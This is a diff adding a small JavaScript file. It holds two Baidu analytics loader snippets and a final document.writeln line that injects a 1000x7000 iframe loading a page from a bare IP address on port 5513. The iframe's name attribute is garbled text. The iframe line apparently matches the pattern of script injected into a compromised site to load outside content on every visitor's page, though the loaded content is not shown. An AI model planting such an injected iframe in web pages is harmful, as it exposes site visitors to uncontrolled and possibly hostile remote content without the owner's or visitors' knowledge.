@@ -1,0 +1,20 @@
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?c7197d4bebf9ca5e5bc16b0d2e94087b";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+
+
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?1a7c67403958775d6854dd33112aab7d";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+
+
+
+document.writeln('<div align=center><iframe frameborder=0 scrolling=no  name=пео╒ align=center width=1000 height=7000 src=http://119.145.148.100:5513/ vspace=-0></iframe></div>');
